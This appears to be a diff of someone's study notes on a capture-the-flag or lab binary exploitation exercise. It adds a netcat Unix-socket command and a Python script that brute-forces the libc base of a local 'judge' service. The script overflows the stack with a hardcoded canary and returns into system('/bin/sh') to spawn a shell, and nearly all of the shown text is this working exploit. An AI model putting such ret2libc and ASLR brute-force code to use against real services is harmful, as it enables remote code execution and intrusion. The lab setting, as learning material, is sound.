@@ -22,7 +22,7 @@ https://linux.die.net/man/1/nc
 ![[Pasted image 20260710142437.png]]
 ![[Pasted image 20260710142747.png]]
 
-
+nc -U ~/judge_sock
 
 ![[Pasted image 20260710142256.png]]
 ![[Pasted image 20260710142839.png]]
@@ -161,66 +161,113 @@ for i in {1..500}; do ldd $(which judge) 2>/dev/null | grep libc; done | awk -F'
 
 ```python 
 
+
 import socket
 import struct
 import time
+import os
+
 
 SYSTEM_OFFSET = 0x000528b0
 BINSH_OFFSET  = 0x001d3808
+CANARY_BYTES = bytes.fromhex("00f4a168")
 
-CANARY = 0x00a221a5
-
-FLOOR = 0xf7c60000
-CEIL  = 0xf7d70000
+FLOOR = 0xf7c60000    
+CEIL  = 0xf7d70000    
 STEP  = 0x1000
 NUM_GUESSES = (CEIL - FLOOR) // STEP
 
-SOCK_PATH = "~/judge_sock"  # adjust to your actual path
+SOCK_PATH = os.path.expanduser("~/judge_sock")  # adjust if needed
+
+OFFSET_TO_CANARY = 256  # matches your working canary-leak script
+
 
 def p32(val):
     return struct.pack("<I", val)  # little-endian 4-byte pack
 
-def try_base(fake_base):
+
+def build_payload(fake_base):
     system_addr = fake_base + SYSTEM_OFFSET
     binsh_addr  = fake_base + BINSH_OFFSET
 
-    payload  = b"A" * 255
-    payload += p32(CANARY)
-    payload += b"B" * 4
-    payload += p32(system_addr)
-    payload += p32(0x41414141)
-    payload += p32(binsh_addr)
+    payload  = b"A" * (OFFSET_TO_CANARY - 1)   # 255 bytes
+    payload += b"\n"                            # REQUIRED: get_title() needs a
+                                                  # newline or it die()s before
+                                                  # ever reaching the overflow
+    payload += CANARY_BYTES                       # canary (4 bytes)
+    payload += b"B" * 4                          # saved EBP filler
+    payload += p32(system_addr)                  # EIP -> system()
+    payload += p32(0x41414141)                   # fake return addr, don't care
+    payload += p32(binsh_addr)                   # arg to system(): "/bin/sh"
+    return payload
+
+
+RECV_TIMEOUT = 1.0          # seconds to wait for data before giving up
+HANG_THRESHOLD = 0.7        # if recv() takes longer than this, treat 
+
+def try_base(fake_base):
+
+    payload = build_payload(fake_base)
 
     s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
-    s.settimeout(1)
+    s.settimeout(RECV_TIMEOUT)
+
+    start = time.monotonic()
+    timed_out = False
+    resp = None
     try:
         s.connect(SOCK_PATH)
         s.sendall(payload)
-
-        # follow-up command to detect a live shell
-        try:
-            s.sendall(b"id\n")
-        except (BrokenPipeError, OSError):
-            s.close()
-            return None
-
         try:
             resp = s.recv(4096)
         except socket.timeout:
+            timed_out = True
             resp = b""
-
-        s.close()
-        return resp
-    except (ConnectionRefusedError, OSError):
+    except (ConnectionRefusedError, ConnectionResetError, BrokenPipeError, OSError):
+        resp = None
+    finally:
+        elapsed = time.monotonic() - start
         try:
             s.close()
         except Exception:
             pass
-        return None
 
-for n in range(NUM_GUESSES):
-    fake_base = FLOOR + (n * STEP)
-    resp = try_base(fake_base)
-    print(f"[{n}] base={hex(fake_base)} resp={resp!r}")
-    time.sleep(0.02)
+    return {
+        "resp": resp,
+        "elapsed": elapsed,
+        "timed_out": timed_out,
+        "likely_hit": timed_out and elapsed >= HANG_THRESHOLD,
+    }
+
+
+def run_bruteforce():
+    print(f"[*] Brute-forcing libc base in range {hex(FLOOR)}-{hex(CEIL)} "
+          f"({NUM_GUESSES} guesses)")
+
+    for n in range(NUM_GUESSES):
+        fake_base = FLOOR + (n * STEP)
+        result = try_base(fake_base)
+
+        flag = "  <-- POSSIBLE HIT (hung)" if result["likely_hit"] else ""
+        print(f"[{n}] base={hex(fake_base)} "
+              f"elapsed={result['elapsed']:.3f}s "
+              f"resp={result['resp']!r}{flag}")
+
+        if result["likely_hit"]:
+            print(f"\n[+] Base {hex(fake_base)} caused the connection to hang "
+                  f"for {result['elapsed']:.3f}s -- this is your strongest signal "
+                  f"of a successful system(\"/bin/sh\") call.")
+            print(f"[+] system_addr = {hex(fake_base + SYSTEM_OFFSET)}")
+            print(f"[+] binsh_addr  = {hex(fake_base + BINSH_OFFSET)}")
+            return fake_base
+
+        time.sleep(0.02)  
+
+    print("[-] No hang detected across the whole range.")
+    return None
+
+
+if __name__ == "__main__":
+    run_bruteforce()
+
 ```
